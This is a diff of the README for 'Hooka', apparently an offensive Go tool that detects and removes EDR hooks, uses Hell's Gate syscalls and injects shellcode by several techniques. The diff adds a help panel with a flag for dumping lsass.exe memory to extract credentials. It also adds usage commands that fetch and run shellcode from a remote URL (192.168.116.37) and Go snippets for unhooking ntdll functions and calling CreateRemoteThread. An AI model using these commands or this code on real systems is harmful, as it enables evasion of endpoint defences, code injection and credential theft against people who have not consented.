@@ -26,7 +26,11 @@ There isn't too much info about detecting Windows hooks in ***Golang*** so I dec
 - Detects hooked functions (i.e. CreateRemoteThread)
 - Compatible with base64 and hex encoded shellcode
 - Hell's Gate technique
-- Capable of unhooking functions
+- Capable of unhooking functions via multiple techniques:
+  - Classic unhooking
+  - Full DLL unhooking
+  - Perun's Fart technique
+
 - Multiple shellcode injection techniques:
   - CreateRemoteThread
   - Fibers
@@ -51,10 +55,43 @@ NtdllDialogWndProc_W
 ZwQuerySystemTime
 ```
 
-Just clone the repository like this:
+- Just clone the repository like this:
 
 ```sh
 git clone https://github.com/D3Ext/Hooka
+```
+
+> This is the help panel
+```
+  _   _                   _              _
+ | | | |   ___     ___   | | __   __ _  | |
+ | |_| |  / _ \   / _ \  | |/ /  / _` | | |
+ |  _  | | (_) | | (_) | |   <  | (_| | |_|
+ |_| |_|  \___/   \___/  |_|\_\  \__,_| (_)
+ by D3Ext - v0.1
+
+  -b64
+        decode base64 encoded shellcode
+  -dll string
+        path to DLL you want to inject with function name sepparated by comma (i.e. evil.dll,xyz)
+  -file string
+        path to file where shellcode is stored
+  -hells
+        enable Hell's Gate technique to try to evade possible EDRs
+  -hex
+        decode hex encoded shellcode
+  -hooks
+        dinamically detect hooked functions by EDR
+  -lsass string
+        dump lsass.exe process memory into a file to extract credentials (run as admin)
+  -t string
+        shellcode injection technique: CreateRemoteThread, Fibers, OpenProcess, EarlyBirdApc (default: random)
+  -test
+        test shellcode injection capabilities by spawning a calc.exe
+  -unhook int
+        overwrite syscall memory address to bypass EDR : 1=classic, 2=full, 3=Perun's Fart
+  -url string
+        remote shellcode url (e.g. http://192.168.1.37/shellcode.bin)
 ```
 
 > Detect hooked functions by EDR (including false positives)
@@ -79,6 +116,16 @@ If no technique is especified it will use a random one
 .\Hooka.exe -t Fibers --file shellcode.bin
 ```
 
+> Decode shellcode from hex
+```sh
+.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hex
+```
+
+> Decode shellcode from base64
+```sh
+.\Hooka.exe --file shellcode.bin --b64
+```
+
 > Inject shellcode using Hell's Gate
 ```sh
 .\Hooka.exe --url http://192.168.116.37/shellcode.bin --hells
@@ -86,8 +133,10 @@ If no technique is especified it will use a random one
 
 > Unhook function before injecting shellcode
 ```sh
-.\Hooka.exe -t OpenProcess --file shellcode.bin --unhook
+.\Hooka.exe -t OpenProcess --file shellcode.bin --unhook 3
 ```
+
+As you can see Hooka provides a lot of CLI flags to help you in all kind of situations
 
 # Demo
 
@@ -95,7 +144,7 @@ If no technique is especified it will use a random one
 <img src="assets/hooks.png">
 
 > Injecting shellcode via CreateRemoteThread
-<img src="assets/test.png">
+<img src="assets/crt.png">
 
 > Test function
 <img src="assets/test.png">
@@ -110,6 +159,8 @@ If no technique is especified it will use a random one
 :black_square_button: More injection techniques
 
 :black_square_button: Better error handling
+
+:black_square_button: Test unhooking functions against some EDR
 
 # Library
 
@@ -161,12 +212,15 @@ import (
 
 func main(){
 
-  // = CreateRemoteThread
-  proc, err := hooka.FuncFromHash("") // Returns a pointer to function like NewProc()
+  // 8c2beefa1c516d318252c9b1b45253e0549bb1c4 = CreateRemoteThread
+
+  // Returns a pointer to function like NewProc()
+  proc, err := hooka.FuncFromHash("8c2beefa1c516d318252c9b1b45253e0549bb1c4")
   if err != nil {
     log.Fatal(err)
   }
 
+  // Now use the procedure as loading it from dll
   proc.Call()
 
   ...
@@ -201,9 +255,25 @@ func main(){
 }
 ```
 
-> Unhook a function
+> Unhook a function (3 ways)
 ```go
 package main
+
+import (
+  "fmt"
+  "log"
+
+  "github.com/D3Ext/Hooka/pkg/hooka"
+)
+
+func main(){
+  err := hooka.ClassicUnhook("NtCreateThread", "C:\\Windows\\System32\\ntdll.dll")
+  if err != nil {
+    log.Fatal(err)
+  }
+
+  fmt.Println("[+] Function should have been unhooked!")
+}
 ```
 
 # Contributing
@@ -220,6 +290,8 @@ https://github.com/timwhitez/Doge-Gabh
 https://github.com/Ne0nd0g/go-shellcode
 https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks
 https://github.com/Kara-4search/HookDetection_CSharp
+https://github.com/plackyhacker/Peruns-Fart
+https://blog.sektor7.net/#!res/2021/perunsfart.md
 https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
 ```
 
@@ -228,6 +300,10 @@ https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
 Creator isn't in charge of any and has no responsibility for any kind of: illegal use of the project, malicious act, capable of causing damage to third parties
 
 Use this project under your own responsability!
+
+# Changelog
+
+See [CHANGELOG.md](https://github.com/D3Ext/Hooka/blob/main/CHANGELOG.md)
 
 # License
 
